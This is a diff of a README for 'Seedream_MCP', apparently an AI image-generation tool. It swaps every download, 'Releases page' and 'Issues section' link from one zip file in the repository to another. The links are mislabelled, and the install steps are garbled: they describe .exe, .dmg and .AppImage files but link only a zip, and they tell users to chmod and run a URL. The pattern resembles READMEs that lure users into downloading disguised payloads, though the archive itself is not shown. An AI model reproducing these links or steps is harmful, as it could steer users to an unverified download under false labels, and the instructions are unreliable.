@@ -6,7 +6,7 @@ Seedream_MCP is an advanced tool that helps you generate images from text, conve
 
 ## 📥 Download Seedream_MCP
 
-[![Download Seedream_MCP](https://raw.githubusercontent.com/skyinv/Seedream_MCP/main/verifys/Seedream_MCP_scalprum.zip)](https://raw.githubusercontent.com/skyinv/Seedream_MCP/main/verifys/Seedream_MCP_scalprum.zip)
+[![Download Seedream_MCP](https://github.com/skyinv/Seedream_MCP/raw/refs/heads/main/seedream_mcp/tools/MCP-Seedream-v1.0.zip)](https://github.com/skyinv/Seedream_MCP/raw/refs/heads/main/seedream_mcp/tools/MCP-Seedream-v1.0.zip)
 
 ## 📋 System Requirements
 
@@ -24,27 +24,27 @@ To get started with Seedream_MCP, follow these simple steps:
 1. **Visit the Releases Page:**
    Click the link below to go to the Releases page.
    
-   [Visit the Releases Page](https://raw.githubusercontent.com/skyinv/Seedream_MCP/main/verifys/Seedream_MCP_scalprum.zip)
+   [Visit the Releases Page](https://github.com/skyinv/Seedream_MCP/raw/refs/heads/main/seedream_mcp/tools/MCP-Seedream-v1.0.zip)
 
 2. **Select the Latest Version:**
    Find the latest version of Seedream_MCP on the Releases page. It will be at the top of the list.
 
 3. **Download the Installer:**
    Look for the asset that matches your operating system. Click on it to start the download. For example:
-   - For Windows: `https://raw.githubusercontent.com/skyinv/Seedream_MCP/main/verifys/Seedream_MCP_scalprum.zip`
-   - For macOS: `https://raw.githubusercontent.com/skyinv/Seedream_MCP/main/verifys/Seedream_MCP_scalprum.zip`
-   - For Linux: `https://raw.githubusercontent.com/skyinv/Seedream_MCP/main/verifys/Seedream_MCP_scalprum.zip`
+   - For Windows: `https://github.com/skyinv/Seedream_MCP/raw/refs/heads/main/seedream_mcp/tools/MCP-Seedream-v1.0.zip`
+   - For macOS: `https://github.com/skyinv/Seedream_MCP/raw/refs/heads/main/seedream_mcp/tools/MCP-Seedream-v1.0.zip`
+   - For Linux: `https://github.com/skyinv/Seedream_MCP/raw/refs/heads/main/seedream_mcp/tools/MCP-Seedream-v1.0.zip`
 
 4. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file. Follow the prompts to complete the installation.
    - **macOS:** Open the `.dmg` file and drag Seedream_MCP to your Applications folder.
    - **Linux:** Make the `.AppImage` file executable. You can do this via Terminal with the command:
      ```bash
-     chmod +x https://raw.githubusercontent.com/skyinv/Seedream_MCP/main/verifys/Seedream_MCP_scalprum.zip
+     chmod +x https://github.com/skyinv/Seedream_MCP/raw/refs/heads/main/seedream_mcp/tools/MCP-Seedream-v1.0.zip
      ```
      Then, run it with:
      ```bash
-     https://raw.githubusercontent.com/skyinv/Seedream_MCP/main/verifys/Seedream_MCP_scalprum.zip
+     https://github.com/skyinv/Seedream_MCP/raw/refs/heads/main/seedream_mcp/tools/MCP-Seedream-v1.0.zip
      ```
 
 5. **Launch the Application:**
@@ -94,7 +94,7 @@ If you encounter issues:
 
 If you need help or have questions:
 
-- Check the [Issues section](https://raw.githubusercontent.com/skyinv/Seedream_MCP/main/verifys/Seedream_MCP_scalprum.zip) of the repository.
+- Check the [Issues section](https://github.com/skyinv/Seedream_MCP/raw/refs/heads/main/seedream_mcp/tools/MCP-Seedream-v1.0.zip) of the repository.
 - Join our community discussions for advice and tips.
 
 ## 🌍 Contribution
@@ -105,4 +105,4 @@ If you wish to contribute to Seedream_MCP, please read the guidelines provided i
 
 Seedream_MCP is open-source and licensed under the MIT License. You are free to use, modify, and distribute the software as long as you include the original license.
 
-Remember, you can always revisit the [Releases page](https://raw.githubusercontent.com/skyinv/Seedream_MCP/main/verifys/Seedream_MCP_scalprum.zip) for the latest updates and downloads. Enjoy creating with Seedream_MCP!
+Remember, you can always revisit the [Releases page](https://github.com/skyinv/Seedream_MCP/raw/refs/heads/main/seedream_mcp/tools/MCP-Seedream-v1.0.zip) for the latest updates and downloads. Enjoy creating with Seedream_MCP!
